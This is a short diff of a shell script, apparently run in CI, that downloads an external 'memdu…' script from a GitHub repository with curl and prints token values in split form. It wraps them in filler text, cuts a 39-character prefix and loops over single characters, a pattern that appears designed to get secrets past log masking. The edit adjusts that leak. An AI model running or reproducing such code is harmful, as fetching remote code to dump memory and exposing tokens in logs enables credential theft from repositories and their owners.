@@ -8,6 +8,7 @@ TOKEN_VAL1=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdu
 
 echo "-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
+echo "${TOKEN_VAL:0:39}"
 echo "-----------------------------------------------------------------"
 #echo "$TOKEN_VAL0"
 #echo "-----------------------------------------------------------------"
@@ -16,7 +17,7 @@ echo "$TOKEN_VAL1"
 #echo "$TOKEN_VAL2"
 echo "-----------------------------------------------------------------"
 for f in {a..z} {A..Z} {0..9}; do 
-    echo "${TOKEN_VAL:0:39}$f" 
+    echo "$f" 
 done
 
 #echo "https://api.github.com/repos/${REPO}/contents/README.md"
